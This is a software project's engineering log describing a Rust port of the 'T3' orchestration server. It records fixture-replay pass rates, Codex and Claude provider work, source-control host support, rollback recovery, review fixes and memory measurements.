`docs/server-area.md` maps all 42 `server.*` methods: 11 served, 11 for the ACP registry
(another worker), 20 not served. None of the 20 can be served without an outside service, a
change to software on the machine, or a large port into the engine, VCS or store (storage
cleanup, database storage). No new method was registered. Done: the contract's payload limits
for `assets.createUrl`, `terminal.open` and `terminal.attach` (generated from the schema AST;
37 cases agree with the T3 contract's own decode), and a test that proves `git` children are
reaped. Its section "Decisions for Nick" lists what waits on him.

## Engine, part 2: T3's fixtures through this engine (2026-11-14)

**The replay check.** `crates/conn-engine/tools/t3-fixture-replay/check.mjs` runs T3's own
fixture tests (`itRunsReplayFixtures`, `runReplayFixture` in `apps/server/.../testkit`) from
`CONN_MONOREPO` with one function mocked: the scenario runner. Ours hands T3's materialized
steps to `examples/t3_fixture_replay.rs`, which runs them through this engine and the real
provider on a stand-in (Codex: the conformance stub `codex`; Claude: the fake SDK host of the
Claude transcript replay, with a shim that maps the session id as T3's harness pins it). T3's
assertions then judge our stored events (the log is never pruned), projections and shell
snapshots, decoded with the contract's schemas. A frame the recording does not have fails a
fixture, as T3's own replay does. The fixtures, steps and assertions come from the monorepo,
so an upstream change shows. `tools/check.sh` runs it ("t3 fixture replay", about 3 min);
`expected-failures.txt` lists every failing variant with its cause.

Result at the pin: 36 of 159 variants pass (the testkit has 159 fixture variants over 170
transcripts). Claude 18 of 34, Codex 17 of 25, Grok 1 of 15 (it runs since ACP part 3; see
"ACP provider, part 3"; the counts were 17, 16 and 0 before the Codex work below). The 85 variants of Kiro, the ACP registry, fx, Cursor, OpenCode,
Muse and Pi fail because the server does not offer those providers. Of the 26 Claude and Codex failures: 6 are Codex subagents (not built), 9 the
Claude background roster, monitors and wakes (not built), 5 Claude event mapping, 3 steps the
driver cannot run (T3's replay gate), 2 T3's test clock, 1 the engine (below).

Differences the replay found and this work fixed, each with a test:
- `visibleTurnItems` showed every item. Now T3's timeline rule
  (`createOrchestrationV2TurnItemVisibility`): a rolled-back run's items, a queued message
  until its run starts, and an unpaired interrupt result of a superseded attempt are hidden.
  A compact snapshot omits local rows only when they are the first turn items.
- A send right after a rollback raced the rollback on a new provider session. A turn start
  now waits while a rollback of its thread is in flight, as T3's effect outbox orders them.
- A released provider session (idle, provider switch, fresh start) kept its row `ready`.
  Now the row says `stopped` and its live requests expire (`writeReleasedSessionEvents`).
- The provider thread never got `firstRunOrdinal` and `lastRunOrdinal`. The turn start now
  writes them and hands that row to the provider, as T3's `runningProviderThread`.
- `thread.create` refused an unknown project. T3's does not look the project up.

Left open then, fixed since (next section): after a rollback on a new Codex process, T3
sends `thread/resume` again before the next turn.

Seams the replay needed: `EngineConfig::clock` (`ManualClock` for a replay, as T3's
`TestClock`; stored timestamps and the idle release read it),
`SqliteEngine::release_idle_sessions`, `SqliteEngine::stored_events`,
`EngineConfig::runtime_policy_override` (T3's `RuntimePolicy.layerWithOverride`) and
`EngineConfig::command_output_tap` (T3's `CommandOutputRecorder`).

**`freshContext` on a send** (T3's `dispatchMessage`). A fresh send never steers: steer and
restart queue. It is refused while a fork is pending, and while the session holds background
work unless a schedule sent it. It releases the live session and starts a new provider
thread. A schedule's fresh run is a side conversation: the next plain message goes back to
the thread's own provider thread. `fresh_session` scheduled tasks are stored and run fresh
(T3's test ported), and `/mcp` `t3_thread_send` serves `freshContext`. Proven by engine
tests and the ported test; no T3 fixture covers it. Not ported: T3 checks a session's
background work with the live session's probe; this server reads the provider threads'
rosters.

**A turn shows as running late**: fixed on 2026-11-14 (see "Claude provider: what the
fixture replay showed").

Memory (macOS, `memory_load` 1,000 fake turns, release): live heap 365 KiB on `main` and
366 KiB on this branch; RSS at the end 55.2 and 57.5 MiB (the whole-snapshot peak; the
allocator keeps those pages). The new state is one gate per running rollback.

Not done from the brief: merge-back and the portable fork path (`ContextHandoffService`),
prepared runs and setup scripts the T3 way, the remaining 13 commands. Rollback recovery is
done since (next section).

## Codex: the turn start, the effect order and elicitations (2026-11-14)

The fixture replay now passes 35 of 159 variants: Codex 17 of 25 (was 16), Claude 18 of 34
(was 17). Codex conformance: 0 open differences in 37 scenarios (two new: `elicitation`,
`login`).

- **The load of a provider thread at a turn start** (T3's `providerThreadLoadKey` in
  `ProviderSessionManager`). The engine keeps one key per live session: the native thread, the
  provider's load part of the model selection (`Session::thread_load_model_selection`, T3's
  `normalizeThreadLoadModelSelection`; Codex drops the effort) and the runtime policy. A turn
  start resumes the thread when the key differs, as T3 does at every turn start. A rollback's
  own resume does not count, so after a rollback on a new Codex process Codex gets
  `thread/resume` again before `turn/start`. Proof: `thread_rollback_after_restart/codex`
  passes; engine test `a_turn_start_resumes_the_thread_only_when_its_load_changes`.
- **`active` and `idle`.** The turn start marks the provider thread `active` with the write's
  time (`runningProviderThread`); the run's end marks it `idle`, or `error` for a broken
  thread (`finalProviderThreadStatus` in `RunExecutionService`). T3's Codex adapter sends no
  idle update for a root thread; T3's engine writes it. Proof:
  `turn_interrupt_restart/claudeAgent` passes; engine test
  `the_provider_thread_is_active_during_a_turn_and_idle_after`.
- **One effect per thread at a time** (T3's `EffectOutbox.ts` claim query). A thread's effects
  run in the order they were made, one after another; title generation runs outside, as T3
  gives it its own lane. This replaces the rollback gate. Proof: engine tests
  `a_stop_finishes_before_the_next_send_starts`, `a_turn_sent_during_a_rollback_starts_after_it`
  (both fail without the lanes) and `two_sends_start_in_order`. The Claude provider's own lock
  (`turn_control` in `conn-provider-claude/src/session.rs`) serializes only `start_turn` and
  `interrupt_turn`. Through this engine both are lane effects of one thread (Force stop closes
  the session and calls neither), so the lock is no longer needed there. It still guards a
  caller that drives a session directly (the crate's tests and tools). Not removed: another
  worker is in that crate.
- **Rollback retries.** Up to 5 attempts, 100 ms after the first failure and doubling (at most
  30 s); only the last failure sets `rollbackFailure` (T3's `EffectWorker`). A failure after
  the provider rolled back (in the file restore) retries only that step since the review
  fixes ("Engine review fixes"); T3 retries the provider rollback too ("Faults found in the
  T3 server"). Proof: `a_rollback_that_fails_twice_then_works_is_retried`.
- **MCP elicitations for Codex** (`CodexMcpElicitation.ts`). A form elicitation is an
  approval with the app name and the persistence choices; the answer is the form's option,
  with `_meta.persist`. A URL elicitation, a form an approval cannot fill, or one without an
  active turn is declined at once. Proof: T3's nine tests ported case for case, a mapper test,
  and the conformance scenario `elicitation` (T3's approval recording with the command
  approval swapped for a form elicitation; both servers send the same reply).
- **The login shell environment, proven.** Conformance scenario `login`: each server starts
  with a stand-in login shell; TS runs `os-jank.ts` `fixPath`, Rust the start-up `hydrate`.
  Both find `codex-conn-login`, which only the stand-in's `PATH` holds, and give it the same
  `PATH` (T3's merge), `__MISE_DIFF` and `JAVA_HOME`. The check fails when the Rust side skips
  the login shell (tried).

Open from that brief:
- **Codex subagents** (6 variants): not started. T3's part is about 1,500 lines of its Codex
  adapter (child threads, task updates, child approvals, per-agent usage). `subagent_v2`
  sends no extra request to Codex; it is a mapping job.
- **`queued_turn`**: a provider clock seam does not make it pass (tried, reverted). Both
  servers stamp agent messages with Codex's `startedAtMs`; why T3's queued message and first
  answer tie is not established.

Memory (macOS, `memory_load` 1,000 fake turns, release): live heap 414 KiB at turn 1,000 and
345 KiB after close (`main`, as recorded in "Engine, part 2": 365 KiB); RSS at the end 57.1 MiB
(`main`: 55.2 to 57.5). Measured on this branch only; the `main` numbers are the earlier
record, not a run beside it. New state: one lane entry per thread with effects waiting (removed when its last
effect ends) and one load key per live session.

## Source control, part 3 (2026-11-14)

`sourceControl.lookupRepository`, `cloneRepository` and `publishRepository` now work on all 7
hosts. Forgejo goes through fj (its `keys.json` token, `fj --host <url> whoami`) or tea (`tea
api`), as T3's `ForgejoCli` picks the login; GitCafe through the Settings token, `CAFE_TOKEN`
or `cafe`'s credential helper, with T3's admission wait on create. Closed from part 2: GitHub
Enterprise Server remotes are recognised; Bitbucket follows redirects as fetch does; every
`git` child (and the clone) loses inherited `GIT_DIR`-style variables. Proven by T3's own
Forgejo `api` cases and GitCafe host, credential and provider cases, ported against stub CLIs
and a loopback server (24 new tests). No new method: the change-request steps need T3's
definition registry, provider detection and GitHub's GraphQL documents first
(`crates/conn-source-control/README.md`, "What the next steps need"). No new dependency;
the macOS release binary grew from 16,558,944 to 16,605,712 bytes (+46,768). `tools/check.sh`
passed all 30 checks with `CONN_MONOREPO` set; the fixture replay is unchanged.

## Claude provider: background work, Stop with no turn, the status probe (2026-11-14)

Claude passes 32 of T3's 34 fixture variants through this engine, up from 24. Each step has a
test; every change to what the CLI or the SDK receives was compared with the T3 server.

- **Background work** (`crates/conn-provider-claude/README.md`, "Background work and wakes"):
  wake reports and T3's notice on the continuation (`backgroundWorkNotification`), the
  notification summary as its text, owed wake tasks, awaited tasks
  (`Session::await_background_tasks`), the scheduled wakeup entry, wakes of backgrounded and
  nested subagents, subagents resumed with `SendMessage` in a later turn, the prompt echo gate
  (a wake Claude runs before a queued prompt), `compact_boundary` on the turn's compaction row,
  `localCommand` usage and the usage ledger measured on arrival. Every
  `background_tasks_changed` now sends the thread, as T3 (a difference the last worker left).
  Proven by the fixture replay (8 more variants) and unit tests; the crate's 8 replays and the
  T3 transcript replay (18 of 18) still pass. Bounded: 64 entries per list.
- **The replay gate** in the replay driver and the fake SDK host (T3's `makeProviderReplayGate`:
  `release_replay_gate`, `release_replay_gate_after_waiting`). Any stand-in can use it through
  the plan's `replayGates`; only the fake SDK host reads it today.
- **Stop with no turn running.** `thread.stop` with no active run now targets the latest run
  when background work outlives it (`dispatchThreadStop`), and the engine calls the new
  `Session::stop_background_work` for that settled turn (`interruptTurn` with
  `requestRuntimeRestart`). Claude closes the thread's idle query and clears its roster and
  wake state. Proven: engine test `stop_without_a_run_reaches_background_work`; conformance
  scenario `stop_background_idle` (SAME, 2 CLI starts; it fails with 1 start when our side
  skips the Stop). Not written: T3's interrupt request and result items for the settled run.
- **The status entry, probed as T3 probes it** (Nick, 2026-11-14: both probes). `claude
  --version`, the catalog filtered by version (the generator now writes each model's bounds),
  and the capabilities probe in the SDK host (`probeCapabilities`; the host returns the
  account status the SDK reports, never a token). Proven: `tools/probe-conformance/run.mjs`
  runs T3's own `checkClaudeProviderStatus` and ours against stub CLIs: 10 of 10 scenarios
  SAME (missing, failing and hanging `--version`, an old CLI, signed in, signed out with and
  without a home folder, an API key, a failed initialization, disabled), entry, argv,
  environment, stdin and signals. A new check in `tools/check.sh`.
- **Memory of the probe** (macOS, release, stub CLI): the SDK host starts at server start for
  the probe, peaks at 89 MiB RSS, and stops right after it (under 1 s with the stub CLI since the
  fix below; 3 s before it). The server's RSS after it: 10.7 MiB,
  against 10.0 MiB with the probe off. The periodic probe runs only while a foreground client
  holds a `provider-status` activity lease (T3's `BackgroundPolicy`; `server.reportClientActivity`
  now records leases, also for Grok): an idle container starts no CLI and no host after the
  start. `CONN_CLAUDE_STATUS_PROBE=off` turns the Claude probe off; every check that starts the
  server sets it, so no check runs this machine's `claude`.
- **Engine changes (small, named):** `ContinuationRequest.notification` (the provider's notice;
  else the default); `syncSubagentThreadModel` (a native subagent's child thread takes the model
  the provider reports later); `Effect::StopBackgroundWork` from `thread.stop`. Trait additions:
  `Session::stop_background_work` (default: nothing). Server: activity leases gate the periodic
  probe; `main.rs` sets the Claude probe's cwd (the state folder) and the off switch.

**A defect the fixture replay showed under load (fixed).** `Helper::function` still held its
stdin sender when it called `stop_if_idle`, so an SDK host that served only a `fn` call
(`resolveSettings` at every cold start, `probeCapabilities`, `forkSession`) never saw the end of
its input: it waited out the 3 s grace and was SIGKILLed with its process group. Every cold start
was 3 s slower for it. In the replay, the kill reached the shim first; the orphaned fake host
then saw EOF and rewrote its state file, and under load the group kill could land between the
truncate and the write, so the next host started at cursor 0 (`claude_idle_resume` failed once
in a full run at load 17 with a `resume` where the recording expects a fresh `sessionId`). The
host now ends on EOF at once (test `a_host_used_only_for_a_function_ends_on_end_of_input`, which
fails without the fix); the fake host writes its state file through a rename. T3 runs the SDK
in process, so it has no such step. Under load (a release build beside it, load 8 to 12): 15 of
15 runs green after the fix; before it, 12 of 12 runs at load 13 to 20 passed too, so the
proof is the test and the trace (four fake hosts for two turns, each `fn` host killed after
3 s without its EOF save).

After the merge of `main` (6ad65f2) Claude passes **34 of 34** fixture variants: the last one,
`claude_background_subagent_after_root`, passes with `main`'s checkpoint capture in the thread's
lane (the wake run now queues behind run 1, as in T3), and `queued_turn` with `main`'s message
order.

**Titles through Claude (built after the merge).** T3 does not use the SDK for them:
`ClaudeTextGeneration.ts` runs the CLI directly (`claude -p --output-format json --json-schema
<schema> --model <api model> [--effort] --settings <json> --tools "" --disable-slash-commands
--no-session-persistence [--strict-mcp-config] --permission-mode dontAsk`, the prompt on stdin,
a fresh temp folder, 180 s, a retry without `--no-session-persistence` for CLIs before 2.0.63).
`ClaudeProvider::generate_text` does the same (`text_generation.rs`); no SDK host, so no memory
cost. Proven: 4 title scenarios in `tools/probe-conformance` (T3's own `generateThreadTitle`
against ours on the stub CLI: argv, environment, folder, stdin and the answer or failure
equal), beside the 10 status scenarios.

**Sealed proofs.** The probe proof's T3 side runs with `sealedNodeEnv` (`tools/sealed-env.mjs`:
only what node needs, a throwaway HOME); a run with `ANTHROPIC_BASE_URL=http://canary.invalid`,
`CLAUDE_CANARY` and `SHELL_CANARY` in the shell shows none of them in its output or files. The
fixture replay, `gen-catalog`, `capture-ts` and the T3 transcript replay are sealed the same way
(before, they passed the shell's environment and the real HOME; our provider read the real
`~/.claude/settings.json` for `env.CLAUDE_CODE_ENTRYPOINT` in both replays). `sealedEnv` now also
drops `ANTHROPIC_*`, `CLAUDE_*` and `CLAUDECODE`.

## Source control, part 4 (2026-11-14)

The three foundations the pull request steps rest on are built and proven; on them, the
engine's pull request links and five `/mcp` tools. No RPC method was added.

- **The host definition registry** (`conn-source-control/src/registry/`): remote recognition in
  T3's recognition order, change request URLs in claim order and per host, canonical repository
  keys, the selector, the project predicates, GitCafe's URL spelling, the thread link keys.
  `registry-diff.mjs` (new check) runs T3's own registry and ours on every literal of T3's
  definition tests and a fixed grid: 24,085 cases, 0 differences.
- **Provider detection** (`detect.rs`, `cache.rs`): the checkout's remotes, the recognised
  context, unknown servers refined through GitHub, GitLab and Forgejo CLIs one after another,
  with T3's two caches (bounded, one shared lookup per key). T3's registry test cases pass on
  scratch repositories with stub CLIs. Nothing calls it yet.
- **GitHub's GraphQL operations, generated** (`gen-graphql.mjs`, new `--check`): 55 operations
  printed by `effect/graphql` from T3's modules, and a batch renderer held to Effect's.
- **Engine: `thread.pull-request.link` and `unlink` as T3's decider** (`pull_requests.rs`):
  canonical keys, a Forgejo port from the URL, GitCafe's spelling, the branch pull request kept
  beside a first manual link, a stack member unlinked to a tombstone that a manual link lifts,
  `thread.pull-request-synced` always (it was `thread.metadata-updated`, and nothing on a
  no-op). Proven through `client-check.mjs` (13 checks).
- **`/mcp`: 33 of 87 tools** (was 28): `link_pull_request(s)`, `unlink_pull_request(s)`,
  `list_thread_pull_requests`; 26 parity steps, values compared, no differences. The argument
  check now decodes array elements and `minItems` in Effect's words.
- New dependency: `url` 2.5 (WHATWG, ICU IDNA): +201,280 bytes on the macOS release binary
  alone. With all of part 4 the binary grew from 16,800,544 to 17,093,088 bytes (+292,544).
- `tools/check.sh` with `CONN_MONOREPO`: all 33 checks pass, none skipped (`check exit: 0`);
  the fixture replay is unchanged at 42 of 159.

Not built, and why: `git.*`, `pr` in VCS status and `pullRequests.*` need a fourth foundation,
the project's `repositoryIdentity` (T3's `RepositoryIdentityResolver`; this engine's project
rows carry none), then GitHub's request policy and each host's change request reads; a method
is registered only when it serves all seven hosts. The fj login check and `cafe` token still
last one operation (T3: 30 s and 5 minutes), and host calls still have no rate-limit slots or
quota. Map: `crates/conn-source-control/README.md`, "What the next steps need".

## Claude provider: what the fixture replay showed (2026-11-14)

Claude passes 24 of T3's 34 fixture variants through this engine, up from 17. Each fix has a
test; every change to what the CLI could see was compared with the T3 server.

- **A cold-start turn shows as running at once.** T3 emits the provider turn right after
  `query()`. Ours first asked the SDK host for Claude's settings, so on a cold start the turn
  showed after the host launched (about 3.5 s). With no live query the turn now opens before
  that call; a start that fails ends it as failed. A steer waits for the start in flight (the
  full replay caught a steer into no query). Proven: a fake-host test (the turn shows within
  1 s while `resolveSettings` takes 1.5 s; the host gets the same commands in the same order);
  conformance 14 of 14 SAME in 5 runs in a row.
- **Event mapping** (5 variants): a subagent's model through the catalog's slugs and aliases
  (`claude-haiku-4-5-20251001` shows as `claude-haiku-4-5`); `otherUsage` from the CLI
  process's `modelUsage` ledger (the crate replay now compares it: 8 of 8 equal); tool titles,
  MCP `toolSource` and `toolIcon`, web search `patterns` and `results`; live Bash output from
  the CLI's task file (`tail.rs`, as `ClaudeTaskOutputTail.ts`; the replay harness writes the
  recorded output as T3's does); and the engine change below.
- **Background roster** (1 of 9 variants): Bash and Monitor tasks on
  `providerThread.pendingBackgroundTasks` (`mapper/roster.rs`), bounded to 64 tasks.
  `claude_background_task_interrupt` passes.
- **Login shell proof.** Both conformance harnesses now start with a stand-in login shell and
  run their server's start-up step (T3's `fixPath`, our `login_env::hydrate`): the CLI's
  `PATH` (merged, blank entries and repeats dropped), `__MISE_DIFF` and `JAVA_HOME` are equal
  in all 14 scenarios, and `JAVA_HOME` already set is kept on both sides.
- **Message steering on a cold start** passes again (it broke with the early turn and was fixed
  before the merge-ready head).
- **Engine change (small):** `finish_run_as` ends with `provider-thread.updated` status
  `idle`, as T3's `writeFinalRunEvents` (`finalProviderThreadStatus`; `error` for a broken
  thread is not carried, no provider reports one). This passed `turn_interrupt_restart` and
  `claude_idle_resume`. Codex: still 16 of 25.

Still failing for Claude (10): 7 background variants (subagents in the roster, Monitor and
task wakes, wakes before a queued prompt, compaction after a resumed wake, a peer turn's
run), 2 that need a replay gate in the fake SDK host, `queued_turn` (T3's test clock). Not built: a Stop with no running turn (T3's `requestRuntimeRestart` closes
an idle query that runs background work; needs the engine to call the provider without a
running turn); the Claude model list by CLI version (T3 probes `claude --version` and drops
models outside their bounds; matching it in full also means T3's capabilities probe, without
which T3 reports `status: warning`).

Memory: the T3 transcript replay (18 scenarios, release) peaked at 4.11–4.16 MiB footprint on
`main` and 3.94–4.28 MiB on the branch (3 runs each); the new state is bounded (64 roster
tasks, 64 links, 8 tails per turn, 16 ledger models).

## Codex: subagents, the replay gate, message order and titles (2026-11-14)

The fixture replay passes 51 of 159 variants (was 42): Codex 25 of 25 (was 17), Claude 25 of
34 (was 24), Grok 1 of 15 (unchanged). Codex conformance: 0 open differences in 40 scenarios
(was 37). `tools/check.sh`: 31 passed, nothing skipped.

- **Codex subagents** (`crates/conn-provider-codex/src/mapper/subagents.rs`), as
  `CodexAdapterV2` maps `collabAgentToolCall`, `subAgentActivity` and child threads. Proof: the
  six subagent recordings replay event for event equal to T3's adapter (115, 87, 36, 50, 103
  and 77 events, the crate's replay test); all six fixture variants pass. What Codex receives
  changed in three places, each compared with T3: a child with no reported model gets
  `thread/read`, then `thread/resume` (conformance compares them as a set: both servers send
  them from a background task, and T3's test kit answers them, so recordings never hold
  them); Stop sends `turn/interrupt` to the root, then each running child turn (new scenario
  `subagentStop`, cut from T3's `subagent_v2` recording); a child of a stopped turn gets
  `turn/interrupt`. The client routes a child thread to the session whose frame names it.
  Bounds: 64 subagents per session, 16 child threads with early turns, 64 stopped turns.
- **Engine changes (small, local; the engine worker owns `runner.rs` and the store):**
  `translate` writes `provider_thread.updated` to its `appThreadId` and
  `provider_turn.updated`/`runtime_request.updated` to the event's `threadId`, as T3's
  `ProviderEventIngestor` (a child's turn no longer becomes the run's provider turn); the
  projection read lists the provider threads a thread's subagents name, and orders messages
  as T3's `sortMessagesByTurnItemOrder`; `runtime-request.respond` ends the request's node and
  turn item and records `questionAnswer`, as T3's `Orchestrator`. No schema change: rows from
  `main` load as before.
- **The replay gate** (T3's `makeProviderReplayGate`) in the stub `codex` and the fake SDK host,
  through files in the scenario folder; `queued_cancelled_while_active/codex` passes. The two
  Claude variants now pass the gate and fail on Claude background wakes (not built). The ACP
  stub has none: its four Grok variants also need `finish_held_run` and Grok background tasks.
- **`queued_turn`.** The cause was never the clock: T3 stores the same `createdAt` stamps
  (dumped from T3's own run) but lists messages by the ordinal of the turn item that shows
  them. With that order the Codex and Claude variants pass; Grok's fails on the buffered
  delivery.
- **Thread titles through Codex.** `Provider::generate_text` (new, additive, default
  `Unsupported`) takes the operation, folder, prompt, T3's output schema text, the selection,
  image paths and a deadline, and returns one JSON object. Codex runs it as
  `CodexTextGeneration.ts`: `codex mcp list --json` (10 s), then `codex exec` (180 s) with T3's
  argv, the prompt on stdin, schema and output files named as T3 names them. The title code
  asks the instance when the title model is not a text generator. Proof: conformance
  `titleListed` and `titleFallback` run T3's own `generateThreadTitle` and ours on the stub:
  argv, environment, folder, stdin bytes, schema file and answer are equal; the schema text is
  generated from the monorepo (`TITLE_OUTPUT_SCHEMA`). Claude still keeps the seed title until
  its provider implements `generate_text`. Not built: T3's fallback to another provider when
  the chosen one is unusable; its managed runtime and custom models in the model choice.
- **The provider thread's `error` status:** nothing to report. T3's Codex adapter ends every
  turn `reusable`, a crash included; a test now holds that.

The subagent wake and the background command wake are built since 2026-11-15 (see "Codex:
the abandoned start and the status probe").

Memory (macOS, `memory_load` 1,000 fake turns, release, run beside `main`): live heap 415 KiB at
turn 1,000 and 346 KiB after close (`main`: 414 and 346); RSS at the end 60.8 MiB (`main`
57.8; allocator pages). The new provider state is bounded as listed above; the mapper's
bound test runs 300 turns with a subagent each.

## Review fixes: source control and text generation (2026-11-14)

A review and a checker's verdict (`/tmp/conn-reviews/source-control-textgen-verdict.md`) gave
these fixes, one commit each, each with a test that fails without it:

- The saved text generator key fills the redaction marker only for a caller with
  `providers:manage` (handler test, both callers).
- `sourceControl.cloneRepository` needs `filesystem:write` as well (`STRICTER` in
  `scopes.rs`; test, both callers).
- `main` reads the login shell's `PATH` before it detects Codex; the server prints
  `providers: …` at start (`tests/login_path.rs`: the binary, a stand-in login shell, a stub
  `codex` only on that shell's `PATH`).
- A text generator base URL that resolves to a link-local address is refused on the dialled
  address (`LinkLocal::Refuse` in `conn_source_control::http`).
- Concurrent login-shell refreshes coalesce (`LoginRefresh`); `claim_refresh` is gone.
- `server.listTextGeneratorModels` is checked at decode (`LIMITED_METHODS`; 6 new limit cases).
- `followed-files.txt` follows the text generation and login environment sources.
- `http`: a fragment after a bare host, a query-only `Location`.
- Stub logs quote the log path and ambiguous arguments.

Left to another worker: host tokens that the T3 server moved to its secret store (finding 3).

## Engine review fixes (2026-11-14)

The confirmed findings of the engine and provider review, fixed on 2026-11-14.

Deliberate differences from the T3 server:

- **A rollback sends the provider rollback once per request.** A retry repeats only the step
  that failed (file restore, stale refs, the commit). The live session moves to the
  rolled-back provider thread only after the commit. T3 sends the provider rollback again on
  every retry, which cuts a Codex thread again each time (see "Faults found in the T3
  server"). In that failure path Codex gets fewer `thread/rollback` requests from us than from
  T3. Nick decided this on 2026-11-14. Proof: `a_failing_restore_rolls_the_provider_back_once`,
  `a_failed_restore_leaves_the_live_session_on_its_thread`.
- **A rollback a crash interrupts after the provider rollback was sent fails on restart.** The
  store keeps each admitted rollback until it commits or fails (`pending_rollbacks`, with its
  phase), as T3 keeps `provider-thread.rollback` in its effect outbox. On open, a rollback that
  had not reached the provider runs again, and one whose provider answer was kept goes on from
  the file restore; both end as in T3, which requeues the effect. A rollback that stopped
  between sending the provider rollback and keeping its answer is recorded as failed, with a
  message that says the provider may already have rolled back. T3 runs it again from the
  provider rollback, which can cut a Codex thread twice. Proof:
  `a_restart_finishes_or_fails_a_rollback_left_pending` (fails without the recovery).

Fixed to match the T3 server, each with a test that fails without the fix:

- A start that fails after Force stop no longer holds the queue: `end_run` holds it only when
  it ended the run (`a_late_start_failure_after_force_stop_does_not_hold_the_queue`).
- The end-of-run checkpoint capture is an effect in the thread's lane, as T3's
  `checkpoint.capture`, so a rollback admitted while a run waits rolls it back too
  (`a_rollback_admitted_while_a_run_waits_for_its_capture_rolls_it_back`). Fixture replay: 42
  of 159, as before.
- `dispatch` and `end_run` take an effect's lane slot under the store lock, so lane order is
  commit order (`lane_order_is_reservation_order`).
- Rollback admission asks the provider instance for its capabilities, as T3's
  `dispatchCheckpointRollback` (`rollback_asks_the_provider_instance_whether_it_can_roll_back`).
- A rollback's own session gets the runtime policy override
  (`a_rollback_session_gets_the_runtime_policy_override`); a dropped session-file call frees
  its SDK host hold (`a_dropped_function_call_releases_its_hold`); the Codex `PATH` search
  skips a file without an execute bit (`find_executable_skips_a_file_that_cannot_run`).

Established, not fixed:

- **Stop during a Claude cold start** (fixed on 2026-11-14; see "Stop during a turn start, as
  the T3 server does it"). In T3 the run is marked `running` before
  `session.startTurn` (`ProviderTurnStartService.ts` 1472-1475, start at 1652). When the
  session has MCP servers, `openQuery` waits for `initializationResult` (up to 5 min) and
  `setMcpServers` (up to 90 s) before it returns (`ClaudeAdapterV2.ts` 1470-1509, called at
  12574), and the provider turn is emitted only after that (12701). A Stop in that window
  finds no provider turn, so `dispatchRunInterrupt` takes its "before provider start" branch
  (`Orchestrator.ts` 13013-13161): the run, attempt and root node end `interrupted` in the
  Stop's own commit, with a `run_interrupt_result` "Run interrupted before provider start",
  and `provider-turn.start` is cancelled (`cancelUnsettled`, `EventSink.ts` 783-794). The
  worker races the running start against that cancellation (`EffectWorker.ts` 816 and 844),
  so the start is interrupted and the half-open CLI is killed (`ClaudeAdapterV2.ts` 1530-1550).
  A T3 client sees the run stop at once. Here, Stop records the request and queues an
  `Interrupt` effect behind the `StartTurn` in the lane; the Claude provider's `start_turn`
  also holds `turn_control` for the whole start (`conn-provider-claude/src/session.rs` 1392,
  `interrupt_turn` waits on it at 1461). The client shows "Stopping" until the start returns,
  up to about 6.5 minutes, and only then is the turn interrupted. Our Claude provider also
  opens the provider turn before the boot (the cold-start change above), so a port of T3's
  branch needs to know whether the provider accepted the turn, not only whether a provider
  turn row exists. Without MCP servers T3 emits the provider turn right after `query()`, and
  both servers take the normal interrupt path.
- **`binaryPath` for Claude and Codex was not applied.** Fixed: see "Provider instance
  settings for Claude and Codex" below.

## Provider instance settings for Claude and Codex (2026-11-14)

Before, the server built Claude and Codex with their defaults and never read
`providerInstances`: a container's binary path, home, launch arguments, environment and
`enabled` were ignored, and Orbit's `claudeLow` … `claudeMax` did not exist. Now, as in the T3
server (`ProviderInstanceRegistryHydration.ts`, `ProviderInstanceRegistry.ts`):

- `claudeAgent` and `codex` always exist; each entry of either driver is one more instance.
  `conn-server/src/instances.rs` builds them from the stored settings before the engine opens
  (so settings Orbit writes before the first start apply to the first turn) and again on
  every settings change. An entry that changes in any field gives a new provider for that id;
  a removed one is dropped; a default instance with its entry removed goes back to its
  defaults. **A live session keeps the provider it opened with** (its CLI, environment and
  arguments) until it closes; the next session gets the new settings. The T3 server does the
  same: an open session keeps its adapter, and the instance is rebuilt for the next one.
- One `ProviderSet` (in `conn-provider`) holds the instances for the engine, titles, `/mcp`
  and the server. `EngineConfig.provider_set` is additive; `EngineConfig.providers` stays.
- The envelope (enabled rule, identity, environment with T3's `~` expansion) is shared by
  Claude, Codex and Grok: `conn-provider-support::instance`. Its environment type prints
  names only in `Debug`; `ClaudeConfig`, `CodexConfig` and `GrokSettings` use it.
- Claude: `binaryPath` (`~`), `homePath` (`~`, made absolute), the environment, and
  `launchArgs` as `makeClaudeQueryOptions` applies them (`--add-dir`, `--permission-mode`,
  `--dangerously-skip-permissions`, both append flags, `--settings` in its own key order,
  every other flag to `extraArgs` in T3's order). Codex: `binaryPath`, `homePath` or a
  `CODEX_HOME` from the environment, the environment, `launchArgs`, and
  `T3CODE_CODEX_LAUNCH_ARGS` from the instance's environment.
- A disabled instance: refused at dispatch (as before, now for every instance), listed with
  T3's disabled entry (also with the Claude probe off), probed never.

Proven:

- Claude conformance: 4 new scenarios (a second instance with a `~` binary and home; an
  environment with plain, sensitive, `CLAUDE_CONFIG_DIR` with `~` and an entrypoint; launch
  arguments; a launch-argument permission mode): all SAME, and the records hold the instance
  values on both sides.
- Claude probe conformance: 2 new (the status entry and a title for an instance with a `~`
  binary, a sensitive variable and an identity): 16 of 16 SAME. T3's side now decodes the entry
  with its own `ProviderInstanceConfig`; that found one harness fault (an untrimmed display
  name), not a server one.
- Codex conformance: 3 new (launch args and an environment with a sensitive value and an
  originator override; `T3CODE_CODEX_LAUNCH_ARGS` from the instance; a title with an instance
  environment): 0 open differences.
- `instances-flow.mjs` (in `tools/check.sh`): settings written before start; a turn on
  `claudeLow` (a `~` binary, a sensitive variable) and on `codexWork` (`homePath` with `~`)
  each starts its recording stub with its environment; the disabled defaults are refused
  with T3's text and listed `disabled`; after `server.updateSettings` the next `claudeLow`
  session runs the new binary with the new environment and without the removed variable; a
  removed instance leaves the list; the sensitive value is in no server output.
- `effect-client.mjs`: the real client decodes a second Claude instance with its display name
  and accent, and a disabled Codex.

Not built, with the reason:

- **The Codex status probe.** Built on 2026-11-15 (see "Codex: the abandoned start and the
  status probe"), with Codex's `customModels`.
- Claude's `customModels` and `autoCompactWindow`, Codex's `shadowHomePath` and `setupMode`
  (T3's managed Codex home).
- More than one instance of Grok (its default instance follows its settings as before).

Deliberate differences: a launch-argument
error text is ours (T3's error classes carry the same facts) and never holds the
`--settings` text.

Not proven: a live turn on a configured instance; the instances on Linux and in a real
Orbit container; a change while a session is open beyond reading T3's code (the flow changes
the settings between sessions).

## Orbit's idle answer (2026-11-14)

`crates/conn-server/tools/idle-diff.mjs` (in `tools/check.sh`, about 30 s) brings the T3 server
and this server into the same states on the Codex stub and compares what Orbit reads from
`GET /api/orchestration/shell`. The fields and the states are in `docs/orbit-profile.md`
("The idle check, proven against T3"). The answers are the same in all states but one. Fixed
on the way:
